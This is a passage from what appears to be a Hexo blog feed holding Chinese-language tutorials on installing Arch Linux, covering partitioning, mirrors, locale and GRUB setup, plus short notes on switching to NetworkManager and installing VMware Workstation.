<h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><p>之前用的一直是netctl这个自带的网络服务，而桌面环境使用的是NetworkManager这个网络服务，所以需要禁用netctl并启用NetworkManager</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">disable</span> netctl</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> NetworkManager</span><br></pre></td></tr></table></figure>
<p>安装工具栏图标显示网络<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S network-manager-applet</span><br></pre></td></tr></table></figure></p>
<p><strong>重启电脑即可</strong></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ArchLinux安装教程</title>
    <url>/posts/a5e4683b/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  Arch Linux是当下最热门的Linux发行版之一，它提供简单、最小化且优雅的体验，Arch可通过自己的喜好定制属于自己的系统，这就带来了一个难题一切都得通过命令行手动定制(包括安装系统)，这对于初学Linux的人来说是不利的，所以不建议初学者安装Arch。<br><a id="more"></a><br>  Arch 优点：</p>
<pre><code>  - 可定制属于自己的Linux系统(与Gentoo几乎并列高定制榜首,只是Gentoo需要自己从内核开始编译安装软件，软件安装速度上没有Arch通过二进制包安装软件包的快)
- 没有预装
- Arch Wiki宝典能解决遇到的几乎所有问题(建议看英文版,中文很多都老旧且有错误，同样Gentoo Wiki也和Arch Wiki一样被视为Linux界的宝典)
- 滚动更新能让你的系统保持最新
- AUR万能仓库能找到几乎所有Linux的软件包(包括其他主流发行版的软件)
</code></pre><p>  Arch 缺点：</p>
<pre><code>  - 一且都从命令行开始,包括安装系统(如果不想从命令行开始可以考虑Manjaro linux入手)
- 只能通过联网安装
- 根动更新可能滚坏系统，但可以滚回去
</code></pre><p>  Arch Linux是一个非常优秀的发行版，优点多于缺点，对于非Linux用来说可能偏技术性，但只要肯投入时间和精力，善于使用Wiki，从零开始搭建完Arch并定制成属于自己的系统，你将掌握很多 GNU/Linux 的内容，相信自己一定能成为别人眼中的大神。</p>
<p>  (ps:其实Linux初学者才更应该从Arch入手，因为Arch Wiki是一本Linux宝典，基本上Linux的所有软件包如何配置，遇到问题如何解决都有详细的说明，同时一切都从命令行开始的Arch能让你更好的理解Linux系统)</p>
<h1 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h1><ul>
<li><p>使用U盘制作启动盘后从U盘进入Live环境,<a href="https://wiki.archlinux.org/index.php/Linux_console/Keyboard_configuration">键盘布局</a>默认为美式键盘映射</p>
</li>
<li><p>检查引导方式<br>现在主要的引导方式有EFI引导+GPT分区表和BIOS(或CSM)引导+MBR分区表两种,不同的主板配置不同。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /sys/firmware/efi/efivars</span><br></pre></td></tr></table></figure>
<p>  如果存在，则可能是纯UEFI方式引导，如果目录不存在，系统可能以 BIOS 或 CSM（即UEFI的Legacy BIOS引导支持） 方式引导,具体查阅主板手册</p>
<ul>
<li><p>联网：</p>
<ul>
<li>有线通过<code>dhcpcd</code>命令获取IP，<code>ping www.bing.com</code>检查网络是否通(Ctr-C终止)</li>
<li>无线网络使用<code>wifi-menu</code>命令通过字符UI连接无线网,<code>ping www.bing.com</code>检查网络是否通</li>
</ul>
<p>Archiso 默认的无线网络管理器已经换成了 <code>iwd</code> ，可通过 <code>iwctl</code> 连接网络<br>查询网卡设备（<code>device list</code>）» 进入iwd提示符（<code>iwctl</code>） »  搜索无线网络（<code>[iwd#] station &lt;devicename&gt; scan</code>） » 显示扫描到的结果（<code>[iwd#] station &lt;devicename&gt; get-networks</code>） » 连接网络（<code>[iwd#] station &lt;devicename&gt; connect &lt;wifi-ssid&gt;</code>） ，输入密码连接即可，知道 id 可直接连接无需搜索。</p>
</li>
<li><p>更新系统时间:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timedatectl set-ntp <span class="literal">true</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><h2 id="建立分区并挂载"><a href="#建立分区并挂载" class="headerlink" title="建立分区并挂载"></a>建立分区并挂载</h2><p>列出被系统的磁盘块设备，可看到磁盘的基本信息<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure></p>
<h3 id="BIOS-MBR方式引导"><a href="#BIOS-MBR方式引导" class="headerlink" title="BIOS/MBR方式引导"></a>BIOS/MBR方式引导</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">安装挂载点</th>
<th style="text-align:center">挂载点</th>
<th style="text-align:center">分区</th>
<th>分区类型</th>
<th style="text-align:center">建议大小</th>
<th style="text-align:center">格式化</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>/mnt</code></td>
<td style="text-align:center"><code>/</code></td>
<td style="text-align:center"><code>/dev/sdX1</code></td>
<td>Linux root (x86-64)</td>
<td style="text-align:center">23~32G</td>
<td style="text-align:center"><code>EXT4</code></td>
</tr>
<tr>
<td style="text-align:center">-</td>
<td style="text-align:center"><code>[SWAP]</code></td>
<td style="text-align:center"><code>/dev/sdX2</code></td>
<td>Linux swap</td>
<td style="text-align:center">大于512M</td>
<td style="text-align:center">-</td>
</tr>
<tr>
<td style="text-align:center"><code>/mnt/home</code></td>
<td style="text-align:center"><code>/home</code></td>
<td style="text-align:center"><code>/dev/sdX3</code></td>
<td>Linux home</td>
<td style="text-align:center">剩余空间</td>
<td style="text-align:center"><code>EXT4</code></td>
</tr>
</tbody>
</table>
</div>
<p><strong>sdX</strong>:<code>X</code>为磁盘号从a开始排，根据自己的硬盘替换</p>
<p><strong>[SWAP]</strong>:<strong>为交换空间分区，相当于虚拟内存，若不不创建该分区，系统将会以文件的形式保存</strong>,<a href="https://wiki.archlinux.org/index.php/Swap">具体参见</a></p>
<p><strong><font color="#ff0000">为了方便管理通常都是不使用分区形式的而是使用文件的形式，这就不过多赘述来，需要的请学会使用Wiki解决问题</font></strong></p>
<ul>
<li>SWAP的建议大小:</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">物理内存(RAM)</th>
<th style="text-align:center">SWAP大小</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>&lt; 4G</code></td>
<td style="text-align:center">2倍RAM</td>
</tr>
<tr>
<td style="text-align:center"><code>4G</code>~<code>8G</code></td>
<td style="text-align:center">等于RAM</td>
</tr>
<tr>
<td style="text-align:center"><code>8G</code>~<code>64G</code></td>
<td style="text-align:center"><code>8G</code></td>
</tr>
<tr>
<td style="text-align:center"><code>&gt; 64G</code></td>
<td style="text-align:center"><code>16G</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="创建分区"><a href="#创建分区" class="headerlink" title="创建分区"></a>创建分区</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入磁盘分区工具</span></span><br><span class="line">fdisk /dev/sdX</span><br></pre></td></tr></table></figure>
<ul>
<li><p>查看磁盘分区信息: <strong><code>p</code></strong></p>
</li>
<li><p>创建MBR分区表:<strong><code>o</code></strong></p>
</li>
<li><p>创建新分区: <strong><code>n</code></strong></p>
<blockquote>
<p>设置分区号(默认) ==&gt; 设置分区起始(默认) ==&gt; 设置分区大小(如:<code>+512M</code>、<code>+32G</code>)</p>
</blockquote>
</li>
<li><p>设置分区类型:<strong><code>t</code></strong></p>
<blockquote>
<p>输入分区号选择分区 ==&gt; 查看支持的分区类型(L列出,上下键分页,q退出) ==&gt;  输入数字选择相应的类型修改</p>
</blockquote>
</li>
<li><p>删除分区:<strong><code>d</code></strong></p>
<blockquote>
<p>输入分区号删除</p>
</blockquote>
</li>
<li><p>获取帮助:<strong><code>m/help</code></strong></p>
</li>
<li><p>保存退出:<strong><code>w</code></strong></p>
</li>
<li><p>不保存退出:<strong><code>q</code></strong></p>
</li>
</ul>
<h4 id="格式化分区"><a href="#格式化分区" class="headerlink" title="格式化分区"></a>格式化分区</h4><p><strong>格式化交换分区</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkswap /dev/sdXY</span><br><span class="line"></span><br><span class="line"><span class="comment">#启用swap</span></span><br><span class="line">swapon /dev/sdXY</span><br></pre></td></tr></table></figure></p>
<p><strong>格式其他分区</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.ext4 /dev/sdXY</span><br></pre></td></tr></table></figure></p>
<font color="ff0000">**`X`、`Y`相应切换即可**</font>

<h4 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h4><ul>
<li><p>根据<strong>安装挂载点</strong>挂载<strong><code>/</code></strong>分区</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sdX1 /mnt/</span><br></pre></td></tr></table></figure>
</li>
<li><p>挂载其他分区(<font color="ff0000"><strong>一定要挂载<code>/</code>分区后再挂载其他分区,这样才能将挂载点创建在<code>/</code>分区上</strong></font>)</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建home分区挂载点</span></span><br><span class="line">mkdir /mnt/home</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载home分区</span></span><br><span class="line">mount /dev/sdX3 /mnt/home</span><br></pre></td></tr></table></figure>
<h3 id="EFI-GPT方式引导"><a href="#EFI-GPT方式引导" class="headerlink" title="EFI/GPT方式引导"></a>EFI/GPT方式引导</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">安装挂载点</th>
<th style="text-align:center">挂载点</th>
<th style="text-align:center">分区</th>
<th>分区类型</th>
<th style="text-align:center">建议大小</th>
<th style="text-align:center">格式化</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>/mnt/boot</code></td>
<td style="text-align:center"><code>/boot</code></td>
<td style="text-align:center"><code>dev/sdX1</code></td>
<td>EFI System</td>
<td style="text-align:center">256~512M</td>
<td style="text-align:center"><code>FAT32</code></td>
</tr>
<tr>
<td style="text-align:center"><code>/mnt</code></td>
<td style="text-align:center"><code>/</code></td>
<td style="text-align:center"><code>dev/sdX2</code></td>
<td>Linux root (x86-64)</td>
<td style="text-align:center">23~32G</td>
<td style="text-align:center"><code>EXT4</code></td>
</tr>
<tr>
<td style="text-align:center">-</td>
<td style="text-align:center"><code>[SWAP]</code></td>
<td style="text-align:center"><code>/dev/sdX3</code></td>
<td>Linux swap</td>
<td style="text-align:center">大于512M</td>
<td style="text-align:center">-</td>
</tr>
<tr>
<td style="text-align:center"><code>/mnt/home</code></td>
<td style="text-align:center"><code>/home</code></td>
<td style="text-align:center"><code>dev/sdX4</code></td>
<td>Linux home</td>
<td style="text-align:center">剩余空间</td>
<td style="text-align:center"><code>EXT4</code></td>
</tr>
</tbody>
</table>
</div>
<p><strong>sdX</strong>:<code>X</code>为磁盘号从a开始排，根据自己的硬盘替换</p>
<p><strong>[SWAP]</strong>:<strong>为交换空间分区，相当于虚拟内存，若不不创建该分区，系统将会以文件的形式保存</strong>,<a href="https://wiki.archlinux.org/index.php/Swap">具体参见</a></p>
<p><strong><font color="#ff0000">为了方便管理通常都是不使用分区形式的而是使用文件的形式，这就不过多赘述来，需要的请学会使用Wiki解决问题</font></strong></p>
<ul>
<li>SWAP的建议大小:</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">物理内存(RAM)</th>
<th style="text-align:center">SWAP大小</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>&lt; 4G</code></td>
<td style="text-align:center">2倍RAM</td>
</tr>
<tr>
<td style="text-align:center"><code>4G</code>~<code>8G</code></td>
<td style="text-align:center">等于RAM</td>
</tr>
<tr>
<td style="text-align:center"><code>8G</code>~<code>64G</code></td>
<td style="text-align:center"><code>8G</code></td>
</tr>
<tr>
<td style="text-align:center"><code>&gt; 64G</code></td>
<td style="text-align:center"><code>16G</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="创建分区-1"><a href="#创建分区-1" class="headerlink" title="创建分区"></a>创建分区</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入磁盘分区工具</span></span><br><span class="line">fdisk /dev/sdX</span><br></pre></td></tr></table></figure>
<ul>
<li><p>查看磁盘分区信息: <strong><code>p</code></strong></p>
</li>
<li><p>创建GPT分区表:<strong><code>g</code></strong></p>
</li>
<li><p>创建新分区: <strong><code>n</code></strong></p>
</li>
</ul>
<blockquote>
<p>设置分区号(默认) ==&gt; 设置分区起始(默认) ==&gt; 设置分区大小(如:<code>+512M</code>、<code>+32G</code>)</p>
</blockquote>
<ul>
<li>设置分区类型:<strong><code>t</code></strong> </li>
</ul>
<p><strong><font color="ff000">一定要设置引导分区的类型</font></strong></p>
<blockquote>
<p>输入分区号选择分区 ==&gt; 查看支持的分区类型(L列出,上下键分页,q退出) ==&gt;  输入数字选择相应的类型修改</p>
</blockquote>
<ul>
<li>删除分区:<strong><code>d</code></strong></li>
</ul>
<blockquote>
<p>输入分区号删除</p>
</blockquote>
<ul>
<li><p>获取帮助:<strong><code>m/help</code></strong></p>
</li>
<li><p>保存退出:<strong><code>w</code></strong></p>
</li>
<li><p>不保存退出:<strong><code>q</code></strong></p>
</li>
</ul>
<h4 id="格式化分区-1"><a href="#格式化分区-1" class="headerlink" title="格式化分区"></a>格式化分区</h4><p><strong>格式化引导分区</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.fat -F32 /dev/sdXY</span><br></pre></td></tr></table></figure>
<p><strong>格式化交换分区</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkswap /dev/sdXY</span><br><span class="line"></span><br><span class="line"><span class="comment">#启用swap</span></span><br><span class="line"></span><br><span class="line">swapon /dev/sdXY</span><br></pre></td></tr></table></figure>
<p><strong>格式其他分区</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.ext4 /dev/sdXY</span><br></pre></td></tr></table></figure></p>
<font color="ff0000">**`X`、`Y`相应切换即可**</font>



<h4 id="挂载分区-1"><a href="#挂载分区-1" class="headerlink" title="挂载分区"></a>挂载分区</h4><ul>
<li>根据安装挂载点<strong>挂载</strong><code>/</code>(根)分区</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sdX2 /mnt/</span><br></pre></td></tr></table></figure>
<ul>
<li>挂载其他分区(<font color="ff0000"><strong>一定要挂载<code>/</code>分区后再挂载其他分区,这样才能将挂载点创建在<code>/</code>分区上</strong></font>)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建EFI分区挂载点</span></span><br><span class="line"></span><br><span class="line">mkdir /mnt/boot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载EFI分区</span></span><br><span class="line"></span><br><span class="line">mount /dev/sdX1 /mnt/boot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建home分区挂载点</span></span><br><span class="line"></span><br><span class="line">mkdir /mnt/home</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载home分区</span></span><br><span class="line"></span><br><span class="line">mount /dev/sdX4 /mnt/home</span><br></pre></td></tr></table></figure>
<h2 id="优化镜像源"><a href="#优化镜像源" class="headerlink" title="优化镜像源"></a>优化镜像源</h2><p>  在<code>mirrorlist</code>文件中保存着所有的镜像源，但它的排序会导致国内的访问速度大大降低，我们需要将国内的更新源放到前面，使包管理器使用的是国内的源，从而加速。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>
<ul>
<li>输入 <code>/China</code> 回车搜索到国内源 ==&gt; 输入 <code>2dd</code> 剪切这两行 ==&gt; 输入 <code>gg</code> 回到文件开头 ==&gt; 输入 <code>p</code> 将剪切的内容贴到开头 ==&gt; 输入 <code>:wq</code>  保存退出</li>
</ul>
<p>推荐清华和中科大源:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br></pre></td></tr></table></figure><br>自行测试，选择自己认为速度快的即可</p>
<h2 id="安装基础包"><a href="#安装基础包" class="headerlink" title="安装基础包"></a>安装基础包</h2><p>使用<code>pacstrap</code>将基础包安装到磁盘上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-headers linux-firmware </span><br></pre></td></tr></table></figure>
<p>base : 基础包</p>
<p>base-devel: 基础扩展包，AUR需要base-devel软件包被安装</p>
<p>linux : linux内核</p>
<p>linux-headers : 内核头文件</p>
<p>linux-firmware : linux框架</p>
<h2 id="配置系统"><a href="#配置系统" class="headerlink" title="配置系统"></a>配置系统</h2><h3 id="配置自动挂载"><a href="#配置自动挂载" class="headerlink" title="配置自动挂载"></a>配置自动挂载</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检验是否正确</span></span><br><span class="line">cat /mnt/etc/fstab</span><br></pre></td></tr></table></figure>
<p><strong>确保几个分区的挂载信息被正确的写入文件，对应的挂载点是否正确</strong></p>
<h3 id="Change-root-到新安装的系统"><a href="#Change-root-到新安装的系统" class="headerlink" title="Change root 到新安装的系统"></a>Change root 到新安装的系统</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure>
<p>Chroot 就是变更当前进程及其子进程的可见根路径。变更后，程序无法访问可见根目录外文件和命令。(如将<code>/mnt</code>视为<code>/</code>后,原来的<code>/mnt</code>外的路径都不可见了，相当于直接启动到了<code>/mnt</code>下的系统里)。这个目录(<code>/mnt</code>)叫作<code>charoot监狱</code>。</p>
<p>切换根目录通常为了系统维护(需要将磁盘上的相应目录根据结构挂载到<code>chroot监狱</code>目录下):</p>
<ul>
<li>重新安装 bootloader.</li>
<li>重建 initramfs 镜像.</li>
<li>更新或 降级软件包.</li>
<li>重置 忘记的密码.</li>
<li>在干净的 chroot 中构建软件包</li>
</ul>
<p><strong>条件:</strong></p>
<ul>
<li>root 权限</li>
<li>另一个 linux 环境，例如 liveCD、USB 闪存介质或者一个已经安装的另一个 linux 发行版。</li>
<li>匹配的架构，chroot 前后的环境架构要一致(例如，都是<code>i686</code> 或 <code>x86_64</code>)。可以用以<code>uname -m</code>命令查看当前环境的架构</li>
<li>提前加载 chroot 环境需要的内核模块</li>
<li>如果需要 <code>swap</code>， chroot 前先启用 <code>swap</code> （<code>swapon /dev/sdxY</code>）</li>
<li>如果需要网络，chroot 之前先建立好网络连接</li>
</ul>
<p><strong>这可能使你的电脑被别人使用chroot修改密码，请在安装完系统后将主板的引导顺序修改为系统启动为第一项，或关闭其他引导方式，关闭引导菜单快捷键，设置UEFI/BIOS 管理密码</strong></p>
<h3 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h3><p>在Linux发行版里中国的时区都使选择上海</p>
<p>创建上海时区的符号链接文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure></p>
<h3 id="提前安装必要的软件包"><a href="#提前安装必要的软件包" class="headerlink" title="提前安装必要的软件包"></a>提前安装必要的软件包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S vim neovim dialog ntfs-3g netctl networkmanager dhclient zsh wpa_supplicant</span><br></pre></td></tr></table></figure>
<p><code>vim</code> :编辑器</p>
<p>neovim：编辑器,与上一个可选</p>
<p><code>dialog</code>: 用于显示来自shell脚本的对话框的工具</p>
<p><code>ntfs-3g</code>:NTFS文件系统驱动程序和实用程序</p>
<p><code>netctl</code> : 网络管理器</p>
<p><code>networkmanager</code>: 检测网络、自动连接网络的程序,与上一个为可选</p>
<p><code>dhclient</code>：DHCP服务,具有全功能的DHCP和IPV6支持，也可安装 <code>dhcpcd</code></p>
<p><code>zsh</code>：shell</p>
<p><code>wpa_supplicant</code>：wifi工具</p>
<h3 id="本地化"><a href="#本地化" class="headerlink" title="本地化"></a>本地化</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/locale.gen</span><br></pre></td></tr></table></figure>
<p>找到 <code>en_US.UTF-8 UTF-8</code> 、 <code>zh_CN.UTF-8 UTF-8</code> 、 <code>zh_HK.UTF-8 UTF-8</code> 、 <code>zh_TW.UTF-8 UTF-8</code> 将前面的注释(<code>#</code>)去掉，保存退出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locale-gen</span><br></pre></td></tr></table></figure>
<p>创建/etc/locale.conf文件并在文件第一行加入<code>LANG=en_US.UTF-8</code><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> LANG=en_US.UTF-8 &gt; /etc/locale.conf</span><br></pre></td></tr></table></figure></p>
<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><ul>
<li>设置主机名</li>
</ul>
<p>创建<code>/etc/hostname</code>文件添加一个主机名(如：<code>myhostname</code>)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> myhostname &gt; /etc/hostname</span><br></pre></td></tr></table></figure></p>
<ul>
<li>设置本地地址解析<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加如下内容，将myhostname替换成自己的主机名</span></span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">::1		localhost</span><br><span class="line">127.0.1.1	myhostname.localdomain	myhostname</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><p>输入两次设置的密码即可，linux上的密码都是不显示的<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure></p>
<h2 id="安装引导程序"><a href="#安装引导程序" class="headerlink" title="安装引导程序"></a>安装引导程序</h2><p>若需要引导Windows+Linux双系统需要安装以下两个包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S os-prober ntfs-3g intel-ucode amd-ucode</span><br></pre></td></tr></table></figure></p>
<p><code>os-prober</code>:用于检测驱动器上其他操作系统</p>
<p><code>ntfs-3g</code>:NTFS文件系统驱动程序和实用程序,用于识别Windows分区</p>
<p><code>intel-ucode / amd-ucode</code>:厂家为CPU更新驱动用的</p>
<h3 id="BIOS-MBR方式引导-1"><a href="#BIOS-MBR方式引导-1" class="headerlink" title="BIOS/MBR方式引导"></a>BIOS/MBR方式引导</h3><h4 id="安装grub"><a href="#安装grub" class="headerlink" title="安装grub"></a>安装grub</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S grub</span><br></pre></td></tr></table></figure>
<p><code>grub</code>:强大的统一引导程序</p>
<h4 id="部署grub"><a href="#部署grub" class="headerlink" title="部署grub"></a>部署grub</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-install --target=i386-pc /dev/sdX</span><br></pre></td></tr></table></figure>
<p><strong>sdX为整个磁盘，不是单独一个分区</strong></p>
<p>若出现<code>will not proceed with blocklists</code>错误，<strong><font color="#ff0000">请检查是否是 BIOS/MBR方式引导及硬盘格式</font></strong>，或加<code>--force</code>强制部署</p>
<h4 id="生成配置文件"><a href="#生成配置文件" class="headerlink" title="生成配置文件"></a>生成配置文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
<h3 id="EFI-GPT方式引导-1"><a href="#EFI-GPT方式引导-1" class="headerlink" title="EFI/GPT方式引导"></a>EFI/GPT方式引导</h3><h4 id="安装grub和efibootmgr"><a href="#安装grub和efibootmgr" class="headerlink" title="安装grub和efibootmgr"></a>安装grub和efibootmgr</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S grub efibootmgr</span><br></pre></td></tr></table></figure>
<p><code>grub</code>:强大的统一引导程序</p>
<p><code>efibootmgr</code>:修改UEFI固件启动管理器变量的工具,用来将启动项写入 NVRAM</p>
<h4 id="生成配置文件-1"><a href="#生成配置文件-1" class="headerlink" title="生成配置文件"></a>生成配置文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
<h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
<p>检查系统的引导项是否被写进gurd配置文件中</p>
<h4 id="部署grub-1"><a href="#部署grub-1" class="headerlink" title="部署grub"></a>部署grub</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot</span><br></pre></td></tr></table></figure>
<p>将在固件启动管理器中创建一个名叫 GRUB 的条目<br>target通过<code>uname -m</code>查看架构选择</p>
<h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><ul>
<li>输入<code>exit</code>退出chroot环境</li>
<li>手动卸载被挂载的分区:<code>umount -R /mnt</code></li>
<li>重启：<code>reboot</code></li>
</ul>
<p><strong><conf color="ff0000">UEFI/GPT方式引导，若重启未进入grub引导，说明UEFI的引导是设备引导，需要<code>/boot(efi)/boot/bootx64.efi</code>文件，只需将<code>grubx64.efi</code>复制到指定目录重命名为<code>bootx64.efi</code>即可</conf></strong></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://wiki.archlinux.org/index.php/Installation_guide">Arch Wiki</a></p>
<p><a href="https://www.viseator.com/2017/05/17/arch_install/">以官方Wiki的方式安装ArchLinux</a></p>
<p><a href="https://blog.csdn.net/r8l8q8/article/details/76516523">ArchLinux安装图文教程</a></p>
<p><a href="https://wiki.gentoo.org/wiki/Handbook:X86/Installation/Bootloader">引导程序安装 Gentoo Wiki</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ArchLinux系安装VMware</title>
    <url>/posts/331864ab/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="从aur库安装"><a href="#从aur库安装" class="headerlink" title="从aur库安装"></a>从aur库安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay vmware-workstation</span><br></pre></td></tr></table></figure>
<p>首次启动使用root权限启动激活</p>
<h2 id="下载的安装包安装"><a href="#下载的安装包安装" class="headerlink" title="下载的安装包安装"></a>下载的安装包安装</h2><p>下载最新的安装包</p>
<p>安装 依赖项:<br>    fuse2 - 提供 vmware-vmblock-fuse<br>    gksu（AUR） - 支持需要 root 权限的操作（比如内存分配、注册许可证等等）<br>    gtkmm - 支持 GUI<br>    linux-headers - 模块编译所需<br>    ncurses5-compat-libsAUR - 支持安装程序的 —console 选项<br>    libcanberra - 支持事件提示音</p>
<p><a href="https://www.vmware.com/go/tryworkstation">VMware Workstation Pro</a><br><a href="https://www.vmware.com/go/downloadplayer">Player</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./VMware-edition-version.release.architecture.bundle</span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><strong>当安装程序询问 <code>System service scripts directory</code> 的设置时，输入 <code>/etc/init.d</code> 即可</strong><br>安装过程中会收到”No rc*.d style init script directories”错误。这可以安全忽略，因为Arch使用的是systemd.</p>
<p>一些选项：</p>
<ul>
<li><code>--eulas-agreed</code> : 跳过各种许可协议</li>
<li><code>--console</code> : 使用命令行界面，而非 GUI</li>
<li><code>--custom</code> : 允许自定义安装目录，比如/usr/local（记得修改#Systemd 服务一节下，vmware-usbarbitrator.service中的路径）</li>
<li><code>-I</code>, <code>--ignore-errors</code> : 忽略致命错误</li>
<li><code>--set-setting=vmware-workstation serialNumber XXXXX-XXXXX-XXXXX-XXXXX-XXXXX</code> : 设置安装时使用的序列号（有利于脚本化安装）</li>
<li><code>--required</code> : 只询问必要的问题（当结合<code>--eulas-agreed</code>和<code>--console</code>时可以实现静默安装）</li>
</ul>
<h1 id="添加Systemd服务-可选"><a href="#添加Systemd服务-可选" class="headerlink" title="添加Systemd服务(可选)"></a>添加Systemd服务(可选)</h1><p>安装服务包,之后就能使用enable了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay vmware-systemd-services</span><br></pre></td></tr></table></figure>
<p>参考:<a href="https://wiki.archlinux.org/index.php/VMware">VMware Wiki</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title>Archlinux及衍生发行版上运行QQ-TIM-微信-迅雷</title>
    <url>/posts/38442201/</url>
